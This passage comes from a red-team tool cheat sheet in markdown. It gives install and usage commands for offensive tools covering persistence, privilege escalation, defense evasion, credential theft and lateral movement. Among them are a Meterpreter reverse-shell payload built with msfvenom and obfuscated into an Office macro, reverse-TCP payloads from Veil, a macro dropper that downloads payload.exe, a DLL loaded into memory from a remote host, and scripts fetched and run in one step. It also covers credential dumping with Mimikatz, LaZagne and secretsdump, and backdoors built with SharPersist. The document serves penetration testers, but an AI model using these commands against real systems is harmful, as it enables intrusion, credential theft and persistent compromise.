evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'

# Upload local files to victim
upload local_filename
upload local_filename destination_filename

# Download remote files to local machine
download remote_filename
download remote_filename destination_filename

# Execute .Net assembly into victim memory
Invoke-Binary /opt/csharp/Rubeus.exe

# Load DLL library into victim memory
Dll-Loader -http http://10.10.10.10/SharpSploit.dll
```

Full usage documentation can be found [here](https://github.com/Hackplayers/evil-winrm#documentation).

![image](https://user-images.githubusercontent.com/100603074/210266192-ad53c125-7b3b-4a91-89c1-01c42cb21ef3.png)

*Image used from https://korbinian-spielvogel.de/posts/heist-writeup/*

### [🔙](#tool-list)[Donut](https://github.com/TheWover/donut/)

A tool for in-memory execution of VBScript, JScript, EXE, DLL files and dotNET assemblies. It can be used to load and run custom payloads on target systems without the need to drop files to disk.

**Install: (Windows)** 

```bash
git clone http://github.com/thewover/donut.git
```

To generate the loader template, dynamic library donut.dll, the static library donut.lib and the generator donut.exe. Start an x64 Microsoft Visual Studio Developer Command Prompt, change to the directory where you cloned the Donut repository and enter the following:

```bash
nmake -f Makefile.msvc
```

To do the same, except using MinGW-64 on Windows or Linux, change to the directory where you cloned the Donut repository and enter the following:

```bash
make -f Makefile.mingw
```

**Install: (Linux)** 

```bash
pip3 install donut-shellcode
```

**Usage:** 

```bash
# Creating shellcode from an XSL file that pops up a calculator.
shellcode = donut.create(file=r"C:\\Tools\\Source\\Repos\\donut\\calc.xsl")

# Creating shellcode from an unmanaged DLL. Invokes DLLMain.
shellcode = donut.create(file=r"C:\Tools\Source\Repos\donut\payload\test\hello.dll")
```

For full usage information, see the donut [GitHub Page](https://github.com/TheWover/donut/#4-usage).

See [a recent blog post](https://thewover.github.io/Bear-Claw/) from The Wover for more info.

![image](https://user-images.githubusercontent.com/100603074/210077893-9d42cc2f-0ea0-414f-8103-42e29429321b.png)

### [🔙](#tool-list)[Macro_pack](https://github.com/sevagas/macro_pack)

A tool used to automatize the obfuscation and generation of Office documents, VB scripts, shortcuts, and other formats for red teaming.

**Install: (Binary)** 

1. Get the latest binary from [https://github.com/sevagas/macro_pack/releases/](https://github.com/sevagas/macro_pack/releases/)
2. Download binary on PC with genuine Microsoft Office installed.
3. Open console, CD to binary dir and call the binary

**Install: (Git)** 

```bash
git clone https://github.com/sevagas/macro_pack.git
cd macro_pack
pip3 install -r requirements.txt
```

**Usage:** 

```bash
# Help Page
python3 macro_pack.py  --help

# List all supported file formats
macro_pack.exe --listformats

# Obfuscate the vba file generated by msfvenom and puts result in a new VBA file.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba

# Obfuscate Empire stager VBA file and generate a MS Word document:
macro_pack.exe -f empire.vba -o -G myDoc.docm

# Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe)
echo "https://myurl.url/payload.exe" "dropped.exe" |  macro_pack.exe -o -t DROPPER -G "drop.xlsm" 

# Execute calc.exe via Dynamic Data Exchange (DDE) attack
echo calc.exe | macro_pack.exe --dde -G calc.xslx
```

![image](https://user-images.githubusercontent.com/100603074/209868800-7fbcfdec-8ae8-4693-8438-feebc2309667.png)

### [🔙](#tool-list)[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

A collection of PowerShell scripts and modules that can be used to achieve a variety of red teaming objectives.

Some of the features of PowerSploit:

- Dump password hashes and extract clear-text passwords from memory
- Escalate privileges and bypass security controls
- Execute arbitrary PowerShell code and bypass execution restrictions
- Perform network reconnaissance and discovery
- Generate payloads and execute exploits

**Install:** *1. Save to PowerShell modules folder*

First you will need to download the [PowerSploit Folder](https://github.com/PowerShellMafia/PowerSploit) and save it to your PowerShell modules folder.

Your PowerShell modules folder path can be found with the following command:

```
$Env:PSModulePath
```

**Install:** *2. Install PowerSploit as a PowerShell module*

You will then need to install the PowerSploit module (use the name of the downloaded folder). 

**Note:** *Your PowerShell execution policy might block you, to fix this run the following command.*

```
powershell.exe -ep bypass
```

Now you can install the PowerSploit module.

```
Import-Module PowerSploit
```

**Usage:** 

```
Get-Command -Module PowerSploit
```

![image](https://user-images.githubusercontent.com/100603074/210267625-3135de58-df26-4e0a-9de4-741ad37d2eb9.png)

### [🔙](#tool-list)[Rubeus](https://github.com/GhostPack/Rubeus)

A tool that can be used to perform various actions related to Microsoft Active Directory (AD) environments, such as dumping password hashes, creating/deleting users, and modifying user properties.

Some of the features of Rubeus:

- Kerberoasting
- Golden ticket attacks
- Silver ticket attacks

**Install: (Download)** 

You can install the unofficial pre-compiled Rubeus binary [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe). 

**Install: (Compile)** 

Rubeus is compatible with [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/). Open the rubeus [project .sln](https://github.com/GhostPack/Rubeus), choose "Release", and build.

**Usage:** 

```
Rubeus.exe -h
```

![image](https://user-images.githubusercontent.com/100603074/208250015-674a6fee-95b7-4edf-bd59-fe459cd235ed.png)


### [🔙](#tool-list)[SharpUp](https://github.com/GhostPack/SharpUp)

A nice tool for checking a victims endpoint for vulnerabilites relating to high integrity processes, groups, hijackable paths, etc.

**Install: (Download)** 

You can install the unofficial pre-compiled SharpUp binary [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe). 

**Install: (Compile)** 

SharpUp is compatible with [Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Open the SharpUp [project .sln](https://github.com/GhostPack/SharpUp), choose "Release", and build.

**Usage:** 

```bash
SharpUp.exe audit
#-> Runs all vulnerability checks regardless of integrity level or group membership.

SharpUp.exe HijackablePaths
#-> Check only if there are modifiable paths in the user's %PATH% variable.

SharpUp.exe audit HijackablePaths
#-> Check only for modifiable paths in the user's %PATH% regardless of integrity level or group membership.
```

![image](https://user-images.githubusercontent.com/100603074/210079939-e709cced-04a2-44a5-9da0-f387bc6599b1.png)

Persistence
====================

### [🔙](#tool-list)[Impacket](https://github.com/fortra/impacket)

Impacket provides a set of low-level Python bindings for various network protocols, including SMB, Kerberos, and LDAP, as well as higher-level libraries for interacting with network services and performing specific tasks such as dumping password hashes and creating network shares.

It also includes a number of command-line tools that can be used to perform various tasks such as dumping SAM databases, enumerating domain trusts, and cracking Windows passwords.

**Install:** 

```bash
python3 -m pip install impacket
```

**Install: (With Example Scripts)** 

Download and extract [the package](https://github.com/fortra/impacket), then navigate to the install folder and run...

```bash
python3 -m pip install .
```

**Usage:** 

```bash
# Extract NTLM hashes with local files
secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL

# Gets a list of the sessions opened at the remote hosts
netview.py domain/user:password -target 192.168.10.2

# Retrieves the MSSQL instances names from the target host.
mssqlinstance.py 192.168.1.2

# This script will gather data about the domain's users and their corresponding email addresses.
GetADUsers.py domain/user:password@IP
```

Great [cheat sheet](https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/) for Impacket usage.

![image](https://user-images.githubusercontent.com/100603074/210079475-a13f7fe2-7801-40dd-977b-e179d0658b47.png)

### [🔙](#tool-list)[Empire](https://github.com/EmpireProject/Empire)

Empire is a post-exploitation framework that allows you to generate payloads for establishing remote connections with victim systems.

Once a payload has been executed on a victim system, it establishes a connection back to the Empire server, which can then be used to issue commands and control the target system.

Empire also includes a number of built-in modules and scripts that can be used to perform specific tasks, such as dumping password hashes, accessing the Windows registry, and exfiltrating data.

**Install:** 

```bash
git clone https://github.com/EmpireProject/Empire
cd Empire
sudo ./setup/install.sh
```

**Usage:** 

```bash
# Start Empire
./empire

# List live agents
list agents

# List live listeners
list listeners
```

Nice usage [cheat sheet](https://github.com/HarmJ0y/CheatSheets/blob/master/Empire.pdf) by [HarmJoy](https://github.com/HarmJ0y).

![image](https://user-images.githubusercontent.com/100603074/210080911-b3c7572a-a0dd-4664-a3e1-46b343db8a79.png)

### [🔙](#tool-list)[SharPersist](https://github.com/mandiant/SharPersist)

A Windows persistence toolkit written in C#.

The project has a [wiki](https://github.com/mandiant/SharPersist/wiki).

**Install: (Binary)** 

You can find the most recent release [here](https://github.com/mandiant/SharPersist/releases).

**Install: (Compile)** 

- Download the project files from the [GitHub Repo](https://github.com/mandiant/SharPersist).
- Load the Visual Studio project up and go to "Tools" --> "NuGet Package Manager" --> "Package Manager Settings"
- Go to "NuGet Package Manager" --> "Package Sources"
- Add a package source with the URL "https://api.nuget.org/v3/index.json"
- Install the Costura.Fody NuGet package. The older version of Costura.Fody (3.3.3) is needed, so that you do not need Visual Studio 2019.
	- `Install-Package Costura.Fody -Version 3.3.3`
- Install the TaskScheduler package
	- `Install-Package TaskScheduler -Version 2.8.11`
- You can now build the project yourself!

**Usage:**

A full list of usage examples can be found [here](https://github.com/mandiant/SharPersist#adding-persistence-triggers-add).

```
#KeePass
SharPersist -t keepass -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml" -m add 

#Registry
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add

#Scheduled Task Backdoor
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add

#Startup Folder
SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add
```

![image](https://user-images.githubusercontent.com/100603074/208880117-3ce7eefc-9e0b-477d-ada4-b3867909ff38.png)


Privilege Escalation
====================

### [🔙](#tool-list)[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

LinPEAS is a nice verbose privilege escalation for finding local privesc routes on Linux endpoints. 

**Install + Usage:**

```bash
curl -L "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" | sh
```

![image](https://user-images.githubusercontent.com/100603074/192070104-8a121544-5c88-4c24-8b2e-590700b345e7.png)

### [🔙](#tool-list)[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

WinPEAS is a nice verbose privilege escalation for finding local privesc routes on Windows endpoints. 

**Install + Usage:** 

```bash
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```

![image](https://user-images.githubusercontent.com/100603074/192070193-fed8a0e8-b82a-4338-9209-6352f33ab6b8.png)

### [🔙](#tool-list)[linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

Linux smart enumeration is another good, less verbose, linux privesc tool for Linux.

**Install + Usage:** 

```bash
curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -Lo lse.sh;chmod 700 lse.sh
```

![image](https://user-images.githubusercontent.com/100603074/192070258-2fe8727a-4b75-430d-a84e-da6605750de9.png)

### [🔙](#tool-list)[Certify](https://github.com/GhostPack/Certify)

Certify is a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS).

Certify is designed to be used in conjunction with other red team tools and techniques, such as Mimikatz and PowerShell, to enable red teamers to perform various types of attacks, including man-in-the-middle attacks, impersonation attacks, and privilege escalation attacks.

**Key features of Certify:**
 
- Certificate creation
- Certificate signing
- Certificate import
- Certificate trust modification

**Install: (Compile)** 

Certify is compatible with [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/). Open the Certify project [.sln](https://github.com/GhostPack/Certify), choose "Release", and build.

**Install: (Running Certify Through PowerShell)** 

If you want to run Certify in-memory through a PowerShell wrapper, first compile the Certify and base64-encode the resulting assembly:

```bash
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Certify.exe")) | Out-File -Encoding ASCII C:\Temp\Certify.txt
```

Certify can then be loaded in a PowerShell script with the following (where "aa..." is replaced with the base64-encoded Certify assembly string):

```
$CertifyAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("aa..."))
```

The Main() method and any arguments can then be invoked as follows:

```
[Certify.Program]::Main("find /vulnerable".Split())
```

Full compile instructions can be found [here](https://github.com/GhostPack/Certify#compile-instructions).

**Usage:** 

```bash
# See if there are any vulnerable templates
Certify.exe find /vulnerable

# Request a new certificate for a template/CA, specifying a DA localadmin as the alternate principal
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:VulnTemplate /altname:localadmin
```

Full example walkthrough can be found [here](https://github.com/GhostPack/Certify#example-walkthrough).

![image](https://user-images.githubusercontent.com/100603074/210088651-28899ba5-cbbd-4b03-8000-068fd401476d.png)

### [🔙](#tool-list)[Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)

Get-GPPPassword is a PowerShell script part of the PowerSploit toolkit, it is designed to retrieve passwords for local accounts that are created and managed using Group Policy Preferences (GPP).

Get-GPPPassword works by searching the SYSVOL folder on the domain controller for any GPP files that contain password information. Once it finds these files, it decrypts the password information and displays it to the user.

**Install:** 

Follow the PowerSploit [installation instructions](https://github.com/A-poc/RedTeam-Tools#powersploit) from this tool sheet.

```bash
powershell.exe -ep bypass
Import-Module PowerSploit
```

**Usage:** 

```bash
# Get all passwords with additional information
Get-GPPPassword

# Get list of all passwords
Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
```

![image](https://user-images.githubusercontent.com/100603074/210089230-6a61579b-849d-4175-96ec-6ea75e001038.png)

### [🔙](#tool-list)[Sherlock](https://github.com/rasta-mouse/Sherlock)

PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.

*Supports:*

- MS10-015 : User Mode to Ring (KiTrap0D)
- MS10-092 : Task Scheduler
- MS13-053 : NTUserMessageCall Win32k Kernel Pool Overflow
- MS13-081 : TrackPopupMenuEx Win32k NULL Page
- MS14-058 : TrackPopupMenu Win32k Null Pointer Dereference
- MS15-051 : ClientCopyImage Win32k
- MS15-078 : Font Driver Buffer Overflow
- MS16-016 : 'mrxdav.sys' WebDAV
- MS16-032 : Secondary Logon Handle
- MS16-034 : Windows Kernel-Mode Drivers EoP
- MS16-135 : Win32k Elevation of Privilege
- CVE-2017-7199 : Nessus Agent 6.6.2 - 6.10.3 Priv Esc

**Install: (PowerShell)** 

```bash
# Git install
git clone https://github.com/rasta-mouse/Sherlock

# Load powershell module
Import-Module -Name C:\INSTALL_LOCATION\Sherlock\Sherlock.ps1
```

**Usage: (PowerShell)** 

```bash
# Run all functions
Find-AllVulns

# Run specific function (MS14-058 : TrackPopupMenu Win32k Null Pointer Dereference)
Find-MS14058
```

![image](https://user-images.githubusercontent.com/100603074/210182250-b5e9a4c1-4d30-4591-b06b-7d58098c7fef.png)

*Image used from https://vk9-sec.com/sherlock-find-missing-windows-patches-for-local-privilege-escalation/*

### [🔙](#tool-list)[Watson](https://github.com/rasta-mouse/Watson)

Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.

Great for identifying missing patches and suggesting exploits that could be used to exploit known vulnerabilities in order to gain higher privileges on the system.

**Install:** 

Using [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/). Open the [Watson project .sln](https://github.com/rasta-mouse/Watson), choose "Release", and build.

**Usage:** 

```bash
# Run all checks
Watson.exe
```

![image](https://user-images.githubusercontent.com/100603074/210182370-409be1ac-64f9-4a07-96bd-b0752d7609a2.png)

*Image text used from https://github.com/rasta-mouse/Watson#usage*

### [🔙](#tool-list)[ImpulsiveDLLHijack](https://github.com/knight0x07/ImpulsiveDLLHijack)

A C# based tool that automates the process of discovering and exploiting DLL Hijacks in target binaries. 

The discovered Hijacked paths can be weaponized, during an engagement, to evade EDR's.

**Install:** 

- **Procmon.exe**  -> https://docs.microsoft.com/en-us/sysinternals/downloads/procmon
- **Custom Confirmatory DLL's** :
	- These are DLL files which assist the tool to get the confirmation whether the DLL's are been successfully loaded from the identified hijack path 
	- Compiled from the MalDLL project provided above (or use the precompiled binaries if you trust me!)
	- 32Bit dll name should be: maldll32.dll
	- 64Bit dll name should be: maldll64.dll
	- Install NuGet Package:** PeNet** -> https://www.nuget.org/packages/PeNet/ (Prereq while compiling the ImpulsiveDLLHijack project)

**Note: i & ii prerequisites should be placed in the ImpulsiveDLLHijacks.exe's directory itself.**

- **Build and Setup Information:**

	- **ImpulsiveDLLHijack**

		- Clone the repository in Visual Studio
		- Once project is loaded in Visual Studio go to "Project" --> "Manage NuGet packages"  --> Browse for packages and install "PeNet" -> https://www.nuget.org/packages/PeNet/
		- Build the project!
		- The ImpulsiveDLLHijack.exe will be inside the bin directory.

	- **And for Confirmatory DLL's:**

		- Clone the repository in Visual Studio
		- Build the project with x86 and x64
		- Rename x86 release as maldll32.dll and x64 release as maldll64.dll

	- **Setup:** Copy the Confirmatory DLL's (maldll32 & maldll64) in the ImpulsiveDLLHijack.exe directory & then execute ImpulsiveDLLHijack.exe :))

*Install instructions from https://github.com/knight0x07/ImpulsiveDLLHijack#2-prerequisites*

**Usage:** 

```bash
# Help
ImpulsiveDLLHijack.exe -h

# Look for vulnerabilities in an executable 
ImpulsiveDLLHijack.exe -path BINARY_PATH
```

Usage examples can be found [here](https://github.com/knight0x07/ImpulsiveDLLHijack#4-examples).

![image](https://user-images.githubusercontent.com/100603074/210267803-cefee62b-f16d-4768-81d0-9001ef1a2b98.png)

*Image used from https://github.com/knight0x07/ImpulsiveDLLHijack#4-examples*

Defense Evasion
====================

### [🔙](#tool-list)[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

A PowerShell v2.0+ compatible PowerShell command and script obfuscator. If a victim endpoint is able to execute PowerShell then this tool is great for creating heavily obfuscated scripts.

**Install:** 

```bash
git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
```

**Usage:** 

```bash
./Invoke-Obfuscation
```

![image](https://user-images.githubusercontent.com/100603074/206557377-a522ab7a-5803-48b0-8f3e-d7d7b607e692.png)

### [🔙](#tool-list)[Veil](https://github.com/Veil-Framework/Veil)

Veil is a tool for generating metasploit payloads that bypass common anti-virus solutions.

It can be used to generate obfuscated shellcode, see the official [veil framework blog](https://www.veil-framework.com/) for more info.

**Install: (Kali)** 

```bash
apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
```

**Install: (Git)** 

```bash
sudo apt-get -y install git
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/
./config/setup.sh --force --silent
```

**Usage:** 

```bash
# List all payloads (–list-payloads) for the tool Ordnance (-t Ordnance)
./Veil.py -t Ordnance --list-payloads

# List all encoders (–list-encoders) for the tool Ordnance (-t Ordnance)
./Veil.py -t Ordnance --list-encoders

# Generate a reverse tcp payload which connects back to the ip 192.168.1.20 on port 1234
./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 192.168.1.20 --port 1234

# List all payloads (–list-payloads) for the tool Evasion (-t Evasion)
./Veil.py -t Evasion --list-payloads

# Generate shellcode using Evasion, payload number 41, reverse_tcp to 192.168.1.4 on port 8676, output file chris
./Veil.py -t Evasion -p 41 --msfvenom windows/meterpreter/reverse_tcp --ip 192.168.1.4 --port 8676 -o chris
```

Veil creators wrote a nice [blog post](https://www.veil-framework.com/veil-command-line-usage/) explaining further ordnance and evasion command line usage.

![image](https://user-images.githubusercontent.com/100603074/210136422-6b17671f-8868-4747-a7fe-e75d36b99e61.png)

Credential Access
====================

### [🔙](#tool-list)[Mimikatz](https://github.com/gentilkiwi/mimikatz)

Great tool for gaining access to hashed and cleartext passwords on a victims endpoint. Once you have gained privileged access to a system, drop this tool to collect some creds.

**Install:** 

1. Download the [mimikatz_trunk.7z](https://github.com/gentilkiwi/mimikatz/releases) file.
2. Once downloaded, the `mimikatz.exe` binary is in the `x64` folder.

**Usage:** 

```bash
.\mimikatz.exe
privilege::debug
```

![image](https://user-images.githubusercontent.com/100603074/208253562-5c58d412-ed3e-4ab5-b8e7-11092852c3d0.png)

### [🔙](#tool-list)[LaZagne](https://github.com/AlessandroZ/LaZagne)

Nice tool for extracting locally stored passwords from browsers, databases, games, mail, git, wifi, etc.

**Install: (Binary)** 

You can install the standalone binary from [here](https://github.com/AlessandroZ/LaZagne/releases/).

**Usage:** 

```bash
# Launch all modes
.\laZagne.exe all

# Launch only a specific module
.\laZagne.exe browsers

# Launch only a specific software script
.\laZagne.exe browsers -firefox
```

![image](https://user-images.githubusercontent.com/100603074/208253800-48f960db-d569-4d1a-b39f-d6c7643691e2.png)


### [🔙](#tool-list)[hashcat](https://github.com/hashcat/hashcat)

Tool for cracking password hashes. Supports a large list of hashing algorithms (Full list can be found [here](https://hashcat.net/wiki/doku.php?id=example_hashes)).

**Install: Binary** 

You can install the standalone binary from [here](https://hashcat.net/hashcat/).

**Usage:** 

```bash
.\hashcat.exe --help
```

Nice hashcat command [cheatsheet](https://cheatsheet.haax.fr/passcracking-hashfiles/hashcat_cheatsheet/).

![image](https://user-images.githubusercontent.com/100603074/208263419-94bf92c0-1c83-4366-a6c2-b6533fdcc521.png)

### [🔙](#tool-list)[John the Ripper](https://github.com/openwall/john)

Another password cracker, which supports hundreds of hash and cipher types, and runs on many operating systems, CPUs and GPUs.

**Install:** 

```bash
sudo apt-get install john -y
```

**Usage:** 

```bash
john
```

![image](https://user-images.githubusercontent.com/100603074/208263690-8c2d1253-7261-47da-850d-ca5a8d98ca13.png)

### [🔙](#tool-list)[SCOMDecrypt](https://github.com/nccgroup/SCOMDecrypt)

This tool is designed to retrieve and decrypt RunAs credentials stored within Microsoft System Center Operations Manager (SCOM) databases.

NCC blog post - ['SCOMplicated? – Decrypting SCOM “RunAs” credentials'](https://research.nccgroup.com/2017/02/23/scomplicated-decrypting-scom-runas-credentials/)

**Pre-requisites:** 

To run the tool you will require administrative privileges on the SCOM server. You will also need to ensure that you have read access to the following registry key:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\MOMBins
```

You can check manually that you can see the database by gathering the connection details from the following keys:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\Database\DatabaseServerName
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\Database\DatabaseName
```

**Install: (PS1)** 

```
git clone https://github.com/nccgroup/SCOMDecrypt
cd .\SCOMDecrypt\SCOMDecrypt\
. .\Invoke-SCOMDecrypt.ps1
```

**Install: (Compile)** 

Using [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/) you can compile the SCOMDecrypt binary. 

Open the SCOMDecrypt [project .sln](https://github.com/nccgroup/SCOMDecrypt), choose "Release", and build.

**Usage:** 

```bash
# PS1
Invoke-SCOMDecrypt

# Compiled C# binary
.\SCOMDecrypt.exe
```

![image](https://user-images.githubusercontent.com/100603074/210456718-034ba080-602e-423e-8ac3-b62ef0841208.png)

*Image text used from https://github.com/nccgroup/SCOMDecrypt*

Discovery
====================

### [🔙](#tool-list)[PCredz](https://github.com/lgandx/PCredz)

This tool extracts Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface.

**Install:** 

```bash
git clone https://github.com/lgandx/PCredz
```

**Usage:** (PCAP File Folder) 

```python
python3 ./Pcredz -d /tmp/pcap-directory-to-parse/
```

**Usage:** (Live Capture) 

```python
python3 ./Pcredz -i eth0 -v
```

![image](https://user-images.githubusercontent.com/100603074/191007004-a0fd01f3-e01f-4bdb-b89e-887c85a7be91.png)

### [🔙](#tool-list)[PingCastle](https://github.com/vletoux/pingcastle)

Ping Castle is a tool designed to assess quickly the Active Directory security level with a methodology based on risk assessment and a maturity framework. It does not aim at a perfect evaluation but rather as an efficiency compromise.

**Install:** (Download) 

```
https://github.com/vletoux/pingcastle/releases/download/2.11.0.1/PingCastle_2.11.0.1.zip
```

**Usage:** 

```python
./PingCastle.exe
```

![image](https://user-images.githubusercontent.com/100603074/191008405-39bab2dc-54ce-43d1-aed7-53956776a9ef.png)

### [🔙](#tool-list)[Seatbelt](https://github.com/GhostPack/Seatbelt)

Seatbelt is a useful tool for gathering detailed information about the security posture of a target Windows machine in order to identify potential vulnerabilities and attack vectors.

It is designed to be run on a compromised victim machine to gather information about the current security configuration, including information about installed software, services, group policies, and other security-related settings

**Install: (Compile)** 

Seatbelt has been built against .NET 3.5 and 4.0 with C# 8.0 features and is compatible with [Visual Studio Community Edition](https://visualstudio.microsoft.com/downloads/).

Open up the project .sln, choose "release", and build.

**Usage:** 

```bash
# Run all checks and output to output.txt
Seatbelt.exe -group=all -full > output.txt

# Return 4624 logon events for the last 30 days
Seatbelt.exe "LogonEvents 30"

# Query the registry three levels deep, returning only keys/valueNames/values that match the regex .*defini.*
Seatbelt.exe "reg \"HKLM\SOFTWARE\Microsoft\Windows Defender\" 3 .*defini.* true"

# Run remote-focused checks against a remote system
Seatbelt.exe -group=remote -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
```

Full command groups and parameters can be found [here](https://github.com/GhostPack/Seatbelt#command-groups).

![image](https://user-images.githubusercontent.com/100603074/210137456-14eb3329-f29d-4ce1-a595-3466bd5a962f.png)

*Image used from https://exord66.github.io/csharp-in-memory-assemblies*

### [🔙](#tool-list)[ADRecon](https://github.com/sense-of-security/adrecon)

Great tool for gathering information about a victim's Microsoft Active Directory (AD) environment, with support for Excel outputs.

It can be run from any workstation that is connected to the environment, even hosts that are not domain members.

[BlackHat USA 2018 SlideDeck](https://speakerdeck.com/prashant3535/adrecon-bh-usa-2018-arsenal-and-def-con-26-demo-labs-presentation)

**Prerequisites** 

- .NET Framework 3.0 or later (Windows 7 includes 3.0)
- PowerShell 2.0 or later (Windows 7 includes 2.0)

**Install: (Git)** 

```bash
git clone https://github.com/sense-of-security/ADRecon.git
```

**Install: (Download)** 

You can download a zip archive of the [latest release](https://github.com/sense-of-security/ADRecon/archive/master.zip). 

**Usage:** 

```bash
# To run ADRecon on a domain member host.
PS C:\> .\ADRecon.ps1

# To run ADRecon on a domain member host as a different user.
PS C:\>.\ADRecon.ps1 -DomainController <IP or FQDN> -Credential <domain\username>

# To run ADRecon on a non-member host using LDAP.
PS C:\>.\ADRecon.ps1 -Protocol LDAP -DomainController <IP or FQDN> -Credential <domain\username>

# To run ADRecon with specific modules on a non-member host with RSAT. (Default OutputType is STDOUT with -Collect parameter)
PS C:\>.\ADRecon.ps1 -Protocol ADWS -DomainController <IP or FQDN> -Credential <domain\username> -Collect Domain, DomainControllers
```

Full usage and parameter information can be found [here](https://github.com/sense-of-security/adrecon#usage).

![image](https://user-images.githubusercontent.com/100603074/210137064-2a0247b3-5d28-409a-904b-0fd9db87ef56.png)

*Image used from https://vk9-sec.com/domain-enumeration-powerview-adrecon/*

Lateral Movement
====================

### [🔙](#tool-list)[crackmapexec](https://github.com/Porchetta-Industries/CrackMapExec)

This is a great tool for pivoting in a Windows/Active Directory environment using credential pairs (username:password, username:hash). It also offered other features including enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL’s into memory using Powershell, dumping the NTDS.dit and more.

**Install:** 

```bash
sudo apt install crackmapexec
```

**Usage:** 

```bash
crackmapexec smb <ip address> -d <domain> -u <user list> -p <password list>
```

![image](https://user-images.githubusercontent.com/100603074/192070626-4549ec06-e2c5-477b-a97d-0f29e48bbfbc.png)

### [🔙](#tool-list)[WMIOps](https://github.com/FortyNorthSecurity/WMIOps)

WMIOps is a powershell script that uses WMI to perform a variety of actions on hosts, local or remote, within a Windows environment.

Developed by [@christruncer](https://twitter.com/christruncer).

Original [blog post](https://www.christophertruncer.com/introducing-wmi-ops/) documenting release.

**Install: (PowerShell)** 

```bash
git clone https://github.com/FortyNorthSecurity/WMIOps
Import-Module WMIOps.ps1
```

**Usage:** 

```bash
# Executes a user specified command on the target machine
Invoke-ExecCommandWMI

# Returns all running processes from the target machine
Get-RunningProcessesWMI

# Checks if a user is active at the desktop on the target machine (or if away from their machine)
Find-ActiveUsersWMI

# Lists all local and network connected drives on target system
Get-SystemDrivesWMI

# Executes a powershell script in memory on the target host via WMI and returns the output
Invoke-RemoteScriptWithOutput
```

![image](https://user-images.githubusercontent.com/100603074/210266302-9c098f03-24fd-4f91-af63-db2fe04c01c7.png)

![image](https://user-images.githubusercontent.com/100603074/210266314-e51c7c99-1e2a-473e-926c-074b56fe79a5.png)

*Images used from https://pentestlab.blog/2017/11/20/command-and-control-wmi/*

### [🔙](#tool-list)[PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell)

Tool that uses MSBuild.exe to remotely execute PowerShell scripts and commands without spawning powershell.exe.

**Install:** 

```bash
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell
cd PowerLessShell
```

**Usage:** 

```bash
# Help
python PowerLessShell.py -h

# Generate PowerShell payload 
python PowerLessShell.py -type powershell -source script.ps1 -output malicious.csproj

# Generating a shellcode payload
python PowerLessShell.py -source shellcode.raw -output malicious.csproj
```

Full usage information can be found [here](https://github.com/Mr-Un1k0d3r/PowerLessShell#usage).

![image](https://user-images.githubusercontent.com/100603074/210266357-75a3f09d-9855-46d5-ad13-69c677b4499f.png)

*Image used from https://bank-security.medium.com/how-to-running-powershell-commands-without-powershell-exe-a6a19595f628*

### [🔙](#tool-list)[PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)

PsExec is a part of the Sysinternals suite of tools, which is a collection of utilities for managing and troubleshooting Windows systems.

It is great for remotely executing commands on target machines.

**Note:** Some AVs detect PsExec as a 'remote admin' virus.

**Install: (PowerShell)** 

```bash
